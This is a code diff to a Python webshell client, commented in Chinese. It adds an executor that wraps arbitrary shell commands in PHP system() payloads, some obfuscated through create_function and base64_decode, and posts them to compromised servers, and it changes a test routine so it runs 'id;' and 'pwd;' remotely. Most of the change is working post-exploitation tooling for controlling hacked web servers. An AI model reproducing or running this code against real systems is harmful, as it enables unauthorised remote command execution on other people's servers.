@@ -1,13 +1,96 @@
 import aiohttp
 import asyncio
 import base64
-from typing import List, Dict, Any, Optional
+from typing import List, Dict, Any, Optional, Tuple
 from loguru import logger
 import time
 from abc import ABC, abstractmethod
 import json
+import requests
+from utils.models import ConnectionInfo
 
 from .config import config
+
+class BaseExecutor:
+    """基础执行器类"""
+    def __init__(self, timeout: int = 10):
+        self.timeout = timeout
+        self.logger = logger
+    
+    def _process_output(self, output: str) -> str:
+        """处理命令输出"""
+        if not output:
+            return ""
+        return output.strip()
+    
+    def execute_command(self, url: str, command: str, connection_info: ConnectionInfo) -> Tuple[bool, str]:
+        """
+        执行WebShell命令
+        """
+        try:
+            # 准备请求头和参数
+            headers = {}
+            data = {}
+            
+            if connection_info.obfuscated:
+                # 处理混淆的 webshell
+                # 将命令进行 base64 编码
+                # 创建一个匿名函数,接受两个参数 $a 和 $b,然后执行命令
+                data = {
+                    connection_info.obfuscated_params['func_name']: 'create_function',
+                    connection_info.obfuscated_params['decode_func']: 'base64_decode',
+                    connection_info.obfuscated_params['param1']: base64.b64encode(''.encode()).decode(),
+                    connection_info.obfuscated_params['param2']: base64.b64encode(f"system('{command}');".encode()).decode(),
+                    connection_info.obfuscated_params['cmd_param']: base64.b64encode(''.encode()).decode()
+                }
+            elif connection_info.use_raw_post:
+                # 使用原始 POST 数据,将命令包装在 system() 中
+                data = f"system('{command}');"  # 直接发送命令作为原始 POST 数据
+                headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            elif connection_info.preg_replace:
+                # preg_replace 类型的 webshell,使用 echo system() 方式
+                php_command = f"echo system('{command}');"
+                data = {connection_info.password: php_command}
+            else:
+                # 将命令包装在 system() 函数中
+                php_command = f"system('{command}');"
+                
+                if connection_info.special_auth and connection_info.special_auth.get('type') == 'user_agent':
+                    # 设置 User-Agent 验证
+                    headers['User-Agent'] = connection_info.special_auth.get('value')
+                    # 将命令作为 $_REQUEST 参数
+                    data = {None: php_command}
+                else:
+                    # 默认使用参数方式
+                    data = {None: php_command}
+                    if connection_info.param_name:
+                        data = {connection_info.param_name: php_command}
+            
+            self.logger.debug(f"发送请求头: {headers}")
+            self.logger.debug(f"发送请求数据: {data}")
+            
+            # 发送请求
+            if connection_info.method.upper() == 'GET':
+                response = requests.get(url, params=data, headers=headers, timeout=self.timeout)
+            else:
+                response = requests.post(url, data=data, headers=headers, timeout=self.timeout)
+            
+            self.logger.debug(f"请求URL: {response.url}")
+            self.logger.debug(f"原始响应: {response.text}")
+            
+            # 处理输出
+            output = self._process_output(response.text)
+            self.logger.debug(f"处理后输出: {output}")
+            
+            if not output and response.status_code == 200:
+                self.logger.error(f"执行失败: status={response.status_code}, output={output}")
+                return False, output
+            
+            return True, output
+            
+        except Exception as e:
+            self.logger.error(f"请求异常: {str(e)}")
+            return False, str(e)
 
 class WebShellConnector(ABC):
     """WebShell连接器基类"""
@@ -185,76 +268,49 @@ class WebShellExecutor:
             })
         return results
 
-async def execute_command(url: str, command: str, connector: Any) -> Dict[str, Any]:
-    """执行单个命令"""
+async def test_webshell(url: str, connection_info: ConnectionInfo, executor: BaseExecutor) -> Dict[str, Any]:
+    """测试WebShell连接"""
     try:
-        async with aiohttp.ClientSession() as session:
-            # 准备请求数据
-            data = connector.prepare_request(command)
-            logger.debug(f"发送请求数据: {data}")
-            
-            # 发送请求
-            async with session.post(url, data=data) as response:
-                response_text = await response.text()
-                logger.debug(f"原始响应: {response_text}")
-                
-                # 处理响应
-                output = connector.process_response(response_text)
-                logger.debug(f"处理后输出: {output}")
-                
-                if not output and response.status == 200:
-                    logger.error(f"执行失败: status={response.status}, output={response_text}")
-                    return {
-                        'success': False,
-                        'command': command,
-                        'error': '命令执行失败或无输出'
-                    }
-                
-                return {
-                    'success': True,
-                    'command': command,
-                    'output': output
-                }
-                
+        # 测试基本命令
+        success, output = executor.execute_command(url, connection_info.test_command, connection_info)
+        if not success:
+            return {
+                'success': False,
+                'error': '基本命令执行失败',
+                'details': output
+            }
+        
+        # 测试系统信息命令
+        success, output = executor.execute_command(url, "id;", connection_info)
+        if not success:
+            return {
+                'success': False,
+                'error': '系统信息命令执行失败',
+                'details': output
+            }
+        
+        # 测试目录命令
+        success, output = executor.execute_command(url, "pwd;", connection_info)
+        if not success:
+            return {
+                'success': False,
+                'error': '目录命令执行失败',
+                'details': output
+            }
+        
+        return {
+            'success': True,
+            'test_output': output,
+            'system_info': output,
+            'current_dir': output
+        }
+        
     except Exception as e:
-        logger.error(f"执行命令时发生错误: {str(e)}")
+        logger.error(f"测试WebShell时发生错误: {str(e)}")
         return {
             'success': False,
-            'command': command,
             'error': str(e)
         }
-
-async def test_webshell(url: str, connector: BaseConnector, 
-                       commands: Optional[List[str]] = None) -> Dict[str, Any]:
-    """测试WebShell功能"""
-    if commands is None:
-        commands = [
-            "whoami",
-            "id",
-            "pwd",
-            "ls -la",
-            "uname -a"
-        ]
-    
-    results = []
-    successful_commands = 0
-    total_execution_time = 0
-    
-    for command in commands:
-        result = await execute_command(url, command, connector)
-        results.append(result)
-        
-        if result['success']:
-            successful_commands += 1
-            # 这里可以添加执行时间统计
-    
-    return {
-        'total_commands': len(commands),
-        'successful_commands': successful_commands,
-        'average_execution_time': total_execution_time / len(commands) if len(commands) > 0 else 0,
-        'total_execution_time': total_execution_time,
-        'results': results
-    }
 
 # 预定义的连接器工厂
 def create_connector(shell_type: str, **kwargs) -> BaseConnector:
